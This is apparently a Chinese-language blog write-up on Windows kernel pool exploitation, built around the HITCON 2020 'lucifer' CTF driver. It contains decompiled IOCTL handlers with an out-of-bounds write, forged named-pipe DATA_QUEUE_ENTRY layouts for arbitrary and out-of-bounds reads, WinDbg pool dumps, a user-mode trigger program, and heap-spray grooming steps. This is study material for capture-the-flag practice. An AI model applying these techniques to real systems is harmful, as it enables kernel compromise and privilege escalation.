<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">Al20c</span><span class="params">(<span class="type">size_t</span> Size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span>* buf = (<span class="type">char</span>*)<span class="built_in">ExAllocatePoolWithTag</span>(NonPagedPoolNx, Size, <span class="string">&#x27;AAAA&#x27;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= Size &amp;&amp; buf; i++)</span><br><span class="line">		buf[i] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">All0c</span><span class="params">(<span class="type">size_t</span> Size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span>* buf = (<span class="type">char</span>*)<span class="built_in">ExAllocatePoolWithTag</span>(NonPagedPoolNx, Size, <span class="string">&#x27;AAAA&#x27;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= Size &amp;&amp; buf; i++)</span><br><span class="line">		buf[i] = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>展示如何创建unbuffered pipe</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__kernel_entry NTSYSCALLAPI NTSTATUS <span class="title">NtFsControlFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            HANDLE           FileHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]  HANDLE           Event,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]  PIO_APC_ROUTINE  ApcRoutine,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]  PVOID            ApcContext,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]           PIO_STATUS_BLOCK IoStatusBlock,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            ULONG            FsControlCode,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]  PVOID            InputBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            ULONG            InputBufferLength,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] PVOID            OutputBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            ULONG            OutputBufferLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//create the pipe/file in FILE_FLAG_OVERLAPPED mode (blocking mode)</span></span><br><span class="line"><span class="built_in">NtFsControlFile</span>(pipe_handle, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;isb, <span class="number">0x119FF8</span>, buf, sz, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<h4 id="溢出数据足够多"><a href="#溢出数据足够多" class="headerlink" title="溢出数据足够多"></a>溢出数据足够多</h4><p>可以控制整个 DATA_QUEUE_ENTRY</p>
<p>IRP任意读</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DATA_QUEUE_ENTRY:</span><br><span class="line"> NextEntry=whatever;</span><br><span class="line"> Irp=Forged IRP Address;</span><br><span class="line"> SecurityContext=ideally <span class="number">0</span>;</span><br><span class="line"> EntryType=<span class="number">1</span>;  <span class="comment">// unbuffered</span></span><br><span class="line"> QuotaInEntry=ideally <span class="number">0</span>;</span><br><span class="line"> DataSize=arbitrary read size;</span><br><span class="line"> x=whatever;</span><br><span class="line"> </span><br><span class="line">IRP-&gt;SystemBuffer = arbitrary read address</span><br></pre></td></tr></table></figure>

<p>修改DataSize越界读</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DATA_QUEUE_ENTRY:</span><br><span class="line"> NextEntry=whatever;</span><br><span class="line"> Irp=ideally <span class="number">0</span>;</span><br><span class="line"> SecurityContext=ideally <span class="number">0</span>;</span><br><span class="line"> EntryType=<span class="number">0</span>;</span><br><span class="line"> QuotaInEntry=ideally <span class="number">0</span>; <span class="comment">//mostly irrelevent in case we use the peek operation</span></span><br><span class="line"> DataSize=something bigger than the original size;</span><br><span class="line"> x=whatever;</span><br></pre></td></tr></table></figure>

<p>相关利用：<a target="_blank" rel="noopener" href="https://github.com/scwuaptx/CTF/tree/master/2020-writeup/hitcon/lucifer">HITCON 2020 lucifer</a></p>
<h4 id="溢出长度比较小"><a href="#溢出长度比较小" class="headerlink" title="溢出长度比较小"></a>溢出长度比较小</h4><p>结构体第一个元素Queue，是一个双向链表</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> *Flink;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> *Blink;</span><br><span class="line">&#125; LIST_ENTRY, *PLIST_ENTRY, PRLIST_ENTRY;</span><br></pre></td></tr></table></figure>

<p>这样是可以修改链表的指向，指向其余的DATA_QUEUE_ENTRY，但是windows存在安全机制，检查<code>entry-&gt;Flink-&gt;Blink!=entry</code></p>
<p>我们可以使用<code>PeekNamedPipe</code> 读取而不释放</p>
<h4 id="overflow-任意地址写"><a href="#overflow-任意地址写" class="headerlink" title="overflow-&gt;任意地址写"></a>overflow-&gt;任意地址写</h4><p>1字节溢出</p>
<h3 id="HITCON-2020-lucifer"><a href="#HITCON-2020-lucifer" class="headerlink" title="HITCON 2020 lucifer"></a>HITCON 2020 lucifer</h3><p><a target="_blank" rel="noopener" href="https://github.com/scwuaptx/CTF/tree/master/2020-writeup/hitcon/lucifer">lucifer</a>：Windows 10 Pro 20H2，一个非常低的权限运行 <code>cmd.exe</code></p>
<p>OOB write，angleboy还带有相关PPT，看PPT</p>
<p>四个功能，经典菜单堆</p>
<p>首先是Create：在NonPagedPoolNx创建0x400大小的chunk</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x222000</span>u:</span><br><span class="line">  <span class="built_in">DbgPrint</span>(<span class="string">&quot;Create\n&quot;</span>);</span><br><span class="line">  v8 = <span class="built_in">sub_1400051DC</span>();</span><br><span class="line">  <span class="keyword">goto</span> LABEL_16;</span><br><span class="line"><span class="function">__int64 <span class="title">sub_1400051DC</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  PVOID PoolWithTag; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="number">0</span>;</span><br><span class="line">  PoolWithTag = Destination;</span><br><span class="line">  <span class="keyword">if</span> ( !Destination )</span><br><span class="line">  &#123;</span><br><span class="line">    PoolWithTag = <span class="built_in">ExAllocatePoolWithTag</span>((POOL_TYPE)<span class="number">512</span>, <span class="number">0x400</span>ui64, <span class="number">0x6963754C</span>u); </span><br><span class="line">    Destination = PoolWithTag;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !PoolWithTag )</span><br><span class="line">    v0 = <span class="number">0xC0000017</span>;</span><br><span class="line">  <span class="built_in">RtlZeroMemory</span>(PoolWithTag, <span class="number">0</span>i64, <span class="number">1024</span>i64);</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ADD: system buffer 是我们传递的参数，可以看出来是个赋值</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x222004</span>u:</span><br><span class="line">  <span class="built_in">DbgPrint</span>(<span class="string">&quot;ADD\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( SystemBuffer &amp;&amp; InputBufferLength &gt;= <span class="number">0x18</span> )</span><br><span class="line">  &#123;</span><br><span class="line">	v11 = SystemBuffer[<span class="number">2</span>];</span><br><span class="line">	v13 = *(_OWORD *)SystemBuffer;          <span class="comment">// SystemBuffer</span></span><br><span class="line">	v14 = v11;</span><br><span class="line">	v8 = <span class="built_in">sub_140001028</span>(&amp;v13);</span><br><span class="line">	<span class="keyword">goto</span> LABEL_16;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_140001028</span><span class="params">(_QWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( !Destination || a1[<span class="number">1</span>] != <span class="number">0xDADADDAA</span>i64 )</span><br><span class="line">    result = <span class="number">0xC0000022</span>i64;</span><br><span class="line">  *((_QWORD *)Destination + *a1) = a1[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>GET：读取内容</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x222008</span>u:</span><br><span class="line">  <span class="built_in">DbgPrint</span>(<span class="string">&quot;GET\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( SystemBuffer &amp;&amp; OutputBufferLength &gt;= <span class="number">0x18</span> &amp;&amp; InputBufferLength &gt;= <span class="number">0x18</span> )</span><br><span class="line">  &#123;</span><br><span class="line">	v9 = SystemBuffer[<span class="number">2</span>];</span><br><span class="line">	v13 = *(_OWORD *)SystemBuffer;</span><br><span class="line">	v14 = v9;</span><br><span class="line">	v8 = <span class="built_in">sub_14000107C</span>(&amp;v13);</span><br><span class="line">	v10 = v14;</span><br><span class="line">	*(_OWORD *)SystemBuffer = v13;</span><br><span class="line">	SystemBuffer[<span class="number">2</span>] = v10;</span><br><span class="line">	a2-&gt;IoStatus.Information = <span class="number">24</span>i64;</span><br><span class="line">	<span class="keyword">goto</span> LABEL_16;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_14000107C</span><span class="params">(_QWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !Destination || a1[<span class="number">1</span>] != <span class="number">3671776682</span>i64 )</span><br><span class="line">    v1 = <span class="number">-1073741790</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *a1 &lt; <span class="number">0x80</span>ui64 )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[<span class="number">2</span>] = *((_QWORD *)Destination + *a1);</span><br><span class="line">    a1[<span class="number">1</span>] = <span class="number">3735928559</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Release，free掉chunk</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x22200C</span>u:</span><br><span class="line">  <span class="built_in">DbgPrint</span>(<span class="string">&quot;Release\n&quot;</span>);</span><br><span class="line">  v8 = <span class="built_in">sub_1400010E0</span>();</span><br><span class="line"><span class="function">__int64 <span class="title">sub_1400010E0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( Destination )</span><br><span class="line">    <span class="built_in">ExFreePoolWithTag</span>(Destination, <span class="number">0x6963754C</span>u);</span><br><span class="line">  Destination = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞点：ADD，有一个越界写。</p>
<p>WritePipe在内核态调用了</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ExAllocatePoolWithTag</span>(NonpagedPoolNx, <span class="built_in">sizeof</span>(payload)+<span class="number">0x30</span>, tag)</span><br></pre></td></tr></table></figure>

<p>每次写pipe，内核态会添加一个<code>DATA_QUEUE_ENTRY</code>。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_DATA_QUEUE_ENTRY</span>&#123;</span><br><span class="line">    LIST_ENTRY Queue;        <span class="comment">// 双向链表</span></span><br><span class="line">    _IRP* Irp;</span><br><span class="line">    __int64 SecurityContext;</span><br><span class="line">    <span class="type">int</span> EntryType;</span><br><span class="line">    <span class="type">int</span> QuotaInEntry;</span><br><span class="line">    <span class="type">int</span> DataSize;           <span class="comment">// 不包含元数据</span></span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">&#125; DATA_QUEUE_ENTRY,*PDATA_QUEUE_ENTRY;</span><br></pre></td></tr></table></figure>

<p>存在一点Debug信息，我们先查看获得对象的大小：0x440, 同时 <code>!pool</code>命令显示 pool header地址</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; lm m Luc*</span><br><span class="line">Browse full module list</span><br><span class="line"><span class="built_in">start</span>             end                 module name</span><br><span class="line">fffff800`<span class="number">40</span>b70000 fffff800`<span class="number">40</span>b78000   Lucifer    (deferred)             </span><br><span class="line"><span class="number">0</span>: kd&gt; ba e1 fffff800`<span class="number">40</span>b70000+<span class="number">0</span>x5200</span><br><span class="line"><span class="number">0</span>: kd&gt; g</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>: kd&gt; p</span><br><span class="line">Lucifer+<span class="number">0</span>x5206:</span><br><span class="line">fffff800`<span class="number">40</span>b75206 <span class="number">48890513</span>deffff  mov     qword ptr [Lucifer+<span class="number">0</span>x3020 (fffff800`<span class="number">40</span>b73020)],rax</span><br><span class="line"><span class="number">1</span>: kd&gt; r rax</span><br><span class="line">rax=ffff9a882f51c460</span><br><span class="line"><span class="number">1</span>: kd&gt; !pool ffff9a882f51c460</span><br><span class="line">Pool page ffff9a882f51c460 region is Nonpaged pool</span><br><span class="line"> ffff9a882f51c000 size:  <span class="number">440</span> previous size:    <span class="number">0</span>  (Allocated)  RLin</span><br><span class="line">*ffff9a882f51c450 size:  <span class="number">440</span> previous size:    <span class="number">0</span>  (Allocated) *Luci</span><br><span class="line">		Owning component : Unknown (update pooltag.txt)</span><br><span class="line"> ffff9a882f51c8b0 size:  <span class="number">440</span> previous size:    <span class="number">0</span>  (Allocated)  Viaa</span><br><span class="line"> ffff9a882f51cd10 size:  <span class="number">220</span> previous size:    <span class="number">0</span>  (Allocated)  AleP</span><br><span class="line"> ffff9a882f51cf30 size:   b0 previous size:    <span class="number">0</span>  (Free)       Y..=</span><br></pre></td></tr></table></figure>

<p>往里面写0x400个内容，0x440 &#x3D; 0x10 pool header + 0x400 chunk + 0x30 padding</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; !pool FFFFA489243E4A20</span><br><span class="line">unable to get nt!PspSessionIdBitmap</span><br><span class="line">Pool page ffffa489243e4a20 region is Nonpaged pool</span><br><span class="line"> ffffa489243e4000 size:  a00 previous size:    <span class="number">0</span>  (Allocated)  Thre</span><br><span class="line">*ffffa489243e4a10 size:  <span class="number">440</span> previous size:    <span class="number">0</span>  (Allocated) *Luci</span><br><span class="line">		Owning component : <span class="built_in">Unknown</span> (update pooltag.txt)</span><br><span class="line"> ffffa489243e4e50 size:  <span class="number">190</span> previous size:    <span class="number">0</span>  (Free)       .l.:</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd&gt; dq FFFFA489243E4A20 L88</span><br><span class="line">ffffa489`<span class="number">243e4</span>a20  <span class="number">00000000</span>`deadbeef <span class="number">00000000</span>`deadbeef</span><br><span class="line"># ...</span><br><span class="line">ffffa489`<span class="number">243e4</span>e10  <span class="number">00000000</span>`deadbeef <span class="number">00000000</span>`deadbeef</span><br><span class="line">ffffa489`<span class="number">243e4</span>e20  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">ffffa489`<span class="number">243e4</span>e30  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">ffffa489`<span class="number">243e4</span>e40  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">ffffa489`<span class="number">243e4</span>e50  ba816c05`<span class="number">08f</span>395a9 <span class="number">00000000</span>`<span class="number">00000000</span></span><br></pre></td></tr></table></figure>

<p>用于调试</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hDevice;</span><br><span class="line">	DWORD dwRet;</span><br><span class="line">	BOOL stat;</span><br><span class="line">	hDevice = <span class="built_in">CreateFileW</span>(</span><br><span class="line">		DEVICE_NAME,</span><br><span class="line">		GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		OPEN_EXISTING,</span><br><span class="line">		FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">	);</span><br><span class="line">	<span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;[-] Error CreateFileW&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line">	stat = <span class="built_in">DeviceIoControl</span>(</span><br><span class="line">		hDevice,</span><br><span class="line">		<span class="number">0x222000</span>,</span><br><span class="line">		<span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">		&amp;dwRet,</span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">	);</span><br><span class="line">	<span class="keyword">if</span> (!stat)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;[-] Error DeviceIoControl&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ADD</span></span><br><span class="line">	UINT64 data[<span class="number">3</span>];</span><br><span class="line">	data[<span class="number">1</span>] = <span class="number">0xDADADDAA</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x80</span>; i++) &#123;</span><br><span class="line">		data[<span class="number">0</span>] = i;</span><br><span class="line">		data[<span class="number">2</span>] = <span class="number">0xdeadbeef</span>;</span><br><span class="line">		stat = <span class="built_in">DeviceIoControl</span>(</span><br><span class="line">			hDevice,</span><br><span class="line">			<span class="number">0x222004</span>,</span><br><span class="line">			&amp;data, <span class="built_in">sizeof</span>(data),</span><br><span class="line">			<span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">			&amp;dwRet,</span><br><span class="line">			<span class="literal">NULL</span></span><br><span class="line">		);</span><br><span class="line">	&#125;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;[+] ADD Done&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="comment">// release</span></span><br><span class="line">	stat = <span class="built_in">DeviceIoControl</span>(</span><br><span class="line">		hDevice,</span><br><span class="line">		<span class="number">0x22200</span>,</span><br><span class="line">		<span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">		&amp;dwRet,</span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">	);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hDevice);</span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>布局堆风水</p>
<p>一种堆喷方式：切割</p>
<ul>
<li>两个chunk: 0x800 + 0x7c0</li>
<li>0x800 切割成一个漏洞对象，另一个是pipe</li>
<li>概率出现想要的风水</li>
</ul>
<p>还可以使用论文中的方式</p>
<ul>
<li>首先,分配上千个选中大小的块,以确保首先清空FreeChunkTree中所有大于所选大小的块.</li>
<li>然后,分配器将分配0x10000字节的新VS字段,并将其放入FreeChunkTree.</li>
<li>然后再分配几千个分块,这些分块最终会进入新的大空闲分块,因此是连续的,然后释放最后分配的块的3分之1,用于填充FreeChunkTree,只是放3分之1将确保不会有数据块合并,最后重新分配已释放的数据块,以最大限度增加喷射机会.</li>
</ul>
<p>理想是得到这样的堆布局</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span>: kd&gt; !pool FFFF8981621A6010</span><br><span class="line">unable to get nt!PspSessionIdBitmap</span><br><span class="line">Pool page ffff8981621a6010 region is Nonpaged pool</span><br><span class="line">*ffff8981621a6000 size:  <span class="number">440</span> previous size:    <span class="number">0</span>  (Allocated) *Luci</span><br><span class="line">		Owning component : Unknown (update pooltag.txt)</span><br><span class="line"> ffff8981621a6450 size:  <span class="number">440</span> previous size:    <span class="number">0</span>  (Allocated)  NpFr Process: ffff898162043080</span><br><span class="line"> ffff8981621a68a0 size:  <span class="number">440</span> previous size:    <span class="number">0</span>  (Allocated)  NpFr Process: ffff898162043080</span><br></pre></td></tr></table></figure>


<p>查看pipe，header</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span>: kd&gt; dq ffff8981621a6450</span><br><span class="line">ffff8981`<span class="number">621</span>a6450  <span class="number">7246704</span>e`<span class="number">0</span>a446f00 f7ca3fb8`<span class="number">9f</span>7f4811</span><br><span class="line">ffff8981`<span class="number">621</span>a6460  ffffcc05`<span class="number">0f</span>d259b8 ffffcc05`<span class="number">0f</span>d259b8</span><br><span class="line">ffff8981`<span class="number">621</span>a6470  <span class="number">00000000</span>`<span class="number">00000000</span> ffffcc05`<span class="number">10</span>a100f0</span><br><span class="line">ffff8981`<span class="number">621</span>a6480  <span class="number">000003</span>d0`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">000003</span>d0</span><br><span class="line">ffff8981`<span class="number">621</span>a6490  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br><span class="line">ffff8981`<span class="number">621</span>a64a0  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br><span class="line">ffff8981`<span class="number">621</span>a64b0  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br><span class="line">ffff8981`<span class="number">621</span>a64c0  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br></pre></td></tr></table></figure>

<p>越界写入</p>
